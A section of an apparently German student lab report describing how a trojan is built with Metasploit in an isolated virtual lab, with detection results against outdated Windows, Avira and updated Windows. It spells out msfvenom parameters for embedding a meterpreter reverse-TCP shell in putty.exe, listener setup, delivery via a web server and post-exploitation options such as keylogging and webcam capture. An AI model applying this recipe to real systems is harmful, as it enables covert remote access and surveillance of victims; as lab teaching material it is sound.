\section{Praktische Durchführung}\label{sec:praktischeDurchfuehrung}
Im folgenden Kapitel wird das bereits vorgestelle Metasploit
Framework genutzt um einen beispielhaften Trojaner zu erstellen.

\subsection{Aufbau}\label{sec:praktischeDurchfuehrung-aufbau}
Für einen möglichst einfachen und gleichzeitig verhältnismäßig sicheren Ablauf
wird das Labor in einer virtualisierten Umgebung ohne Verbindung zum Internet durchgeführt.
Beispielsweise VirtualBox bietet hierfür eine \glqq Internal Networking\grqq{} Einstellung, unter welcher lediglich die virtuellen Maschinen untereinander kommunizieren können.

\begin{figure}[h!]
	\centering
	\begin{tikzpicture}[,>={Stealth[round]},shorten >=1pt,auto,semithick]
		\tikzstyle{pc}=[rectangle,draw=black,minimum size=30pt,inner sep=5pt,align=center]

		\node[pc] (A) at (1,2)  {\underline{Angreifer} \\ (Kali Linux, Metasploit)};
		\node[pc] (V1) at (5,4)  {\underline{Opfer 1}\\(Windows 10, Veraltet)};
		\node[pc] (V2) at (5,2)  {\underline{Opfer 2}\\(Windows 10, Avira)};
		\node[pc] (V3) at (5,0)  {\underline{Opfer 3}\\(Windows 10, Aktuell)};

		\path (A) edge (V1) ;
		\path (A) edge (V2) ;
		\path (A) edge (V3) ;

	\end{tikzpicture}
	\caption{Übersicht} \label{fig:uebersicht}
\end{figure}

An der praktischen Durchführung sind, wie in Abbildung \ref{fig:uebersicht} dargestellt, vier Computer beteiligt.
Auf dem Angreifer läuft das Betriebssystem \glqq Kali Linux\grqq{}, welches bereits das Metasploit Framework enthält.
Außerdem wird der späteren Trojaner über einen Apache Webserver an das Opfer zu übergeben.
Die Opfer nutzen das weit verbreitete Betriebssystem Windows 10. Mit folgenden Unterschieden:

\begin{itemize}
	\item \textbf{Opfer 1}: Veraltete Version von Windows 10 (Stand: 27.04.2018)
	\item \textbf{Opfer 2}: Veraltete Version von Windows 10, allerdings mit Avira Free Security Suite (Version 15.0.36.163)
	\item \textbf{Opfer 3}: Aktualisierte Version von Windows 10 (Stand: 04.05.2018)
\end{itemize}

\subsection{Ablauf}\label{sec:praktischeDurchfuehrung-ablauf}
\begin{figure}[h!]
	\centering
	\begin{sequencediagram}
		\newthread{a}{Angreifer}
		\tikzstyle{inststyle}+=[rounded corners=3mm]
		\newinst{l}{Listener}
		\newinst{t}{Trojaner}
		\tikzstyle{inststyle}+=[rounded corners=false]
		\newthread{v}{Opfer}
		\begin{messcall}{a}{ Erstellen des Trojaners }{t}
		\end{messcall}
		\begin{messcall}{a}{ Aktivieren des Listeners }{l}	
			\begin{call}{a}{ Bereitstellen des Trojaners }{a}{}
				\begin{call}{v}{ Abrufen des Trojaners }{a}{Trojaner}
				\end{call}
				\begin{messcall}{v}{ Ausführen des Trojaners }{t}
					\begin{call}{t}{ Aufbauen der Verbindung }{l}{}
						\mess{l}{Information über Verbindungsaufbau}{a}
					\end{call}
					\begin{call}{a}{ Eingabe von Befehlen }{l}{}
						\begin{call}{l}{ Senden von Befehlen }{t}{}
							\begin{call}{t}{ Audführen von Befehlen }{v}{}
							\end{call}
						\end{call}
					\end{call}
				\end{messcall}
			\end{call}	
		\end{messcall}
	\end{sequencediagram}
	\caption{Ablauf} \label{fig:Ablauf}
\end{figure}

\textbf{1. Erstellen des Trojaners: } 
Zunächst wird auf dem Angreifer der Trojaner erstellt.
Ziel ist es den Payload \code{windows/meterpreter/reverse\_tcp} in ein normales Programm (hier das bekannte \code{putty.exe}) einzuschleusen. 
Dies geschieht mit dem Befehl \code{msfvenom} \cite{OSMSFV}, wksobei folgende Parameter gesetzt werden:
\begin{itemize}
	\item \textbf{Payload}: \\\code{-p windows/meterpreter/reverse\_tcp}
	      \begin{itemize}
		      \item  \textbf{Angreifer-IP}: \code{lhost=192.168.100.101}
		      \item \textbf{Angreifer-Port}: \code{lport=6666}
		  \end{itemize}
	\item \textbf{Architektur}: \code{-a x86}
	\item \textbf{Plattform}: \code{---platform windows}
	\item \textbf{Dateiformat}: \code{-f exe}
	\item \textbf{Vorlage}: \code{-x putty.exe}
	\item \textbf{Vorlage innerhalb des Trojaners ausführen}: \code{-k}
	\item \textbf{Ausgabe (Trojaner)}: \code{-o puttyX.exe}
\end{itemize}

\bigskip
\textbf{2. Aktivieren des Listeners: } \hfill \\
Für den Metasploit-Baukasten gibt es das Hilfsprogramm Armitage, dass die Möglichkeit bietet alle Einstellungen über eine grafische Oberfläche vorzunehmen.
In Armitage wird der Listener über \code{exploit/multi/handler} gestartet. Hierfür muss dieser mit \code{Payload, Ip, Port} aus Schritt 1 konfiguriert werden.


\textbf{3. Verbreiten und Ausführen des Trojaners: } \hfill \\
Der erstellte Trojaner wird in das Wurzelverzeichnis des Webservers \code{/var/www/html} kopiert um diesen einfach, und gleichzeitig verhältnismäßig realitätsnah an die Opfer zu übermitteln.
In der Praxis könnte zum verbreiten des Trojaners zum Beispiel DNS-Spoofing verwendet werden, um dem Opfer den Trojaner statt dem eigentlichen Programm zu übergeben.
Führt das Opfer das Programm mit dem Trojaner aus, so baut dieser eine Verbindung zum Angreifer auf. 


\textbf{4. Attackieren des Opfer-Systems: } \hfill \\
Der Angreifer kann nun mithilfe von Armitage Zugriff auf diverse Systemfunktionalität wie Beispielsweise:
\begin{itemize}
	\item Interaktion (interaction)
		\begin{itemize}
			\item Shell/Kommandozeile öffnen und verwenden
			\item VNC-Verbindung aufbauen
		\end{itemize}
	\item Zugriff (access)
		\begin{itemize}
			\item Privilegien ausweiten
			\item Trojaner persistieren
		\end{itemize}
	\item Entdecken (explore)
		\begin{itemize}
			\item Dateienverzeichnis anzeigen
			\item Prozesse anzeigen
			\item Keylogger aktivieren
			\item Screenshots
			\item Webcamaufnahmen 
		\end{itemize}
\end{itemize}

\subsection{Funktionsweise des Trojaners}\label{sec:praktischeDurchfuehrung-funktionsweise}
\textbf{Was macht der Trojaner? }
Der Trojaner stellt die Verbindung vom Opfer-System zum Angreifer her.

\textbf{Welche Schwachstelle wird ausgenutzt? }
\begin{itemize}
	\item Fehlende Updates
	\item Nutzer-Schwachstelle beim Download
		\begin{itemize}
			\item kein https
			\item keine Überprüfung der Programmsignatur
		\end{itemize}
\end{itemize}

\subsection{Ergebnisse}\label{sec:praktischeDurchfuehrung-ergebnisse}

\textbf{Bewertung des Baukastens} 
	\begin{itemize}
		\item leichte Bedienung
		\item kein Fachwissen notwendig
		\item zahlreiche Möglichkeiten durch modulares System
	\end{itemize}

\textbf{Bewertung des Trojaners}
Die Trojaner ist sehr einfach zu Erzeugen und Anzuwenden. 
Dieser Trojaner ist jedoch durch einfache Schutzmechanismen bereits zu erkennen.
Im Versuch zeigte sich, dass sowohl die aktualisierte Windows-Version sowie der Avira-Schutz den Trojaner rechtzeitig erkennen konnten.
Lediglich die veraltete Windows-Version konnte den Trojaner nicht erkennen. 
Der Trojaner selbst richtet keinen Schaden an, eröffnet jedoch Möglichkeiten für weitere Angriffe.
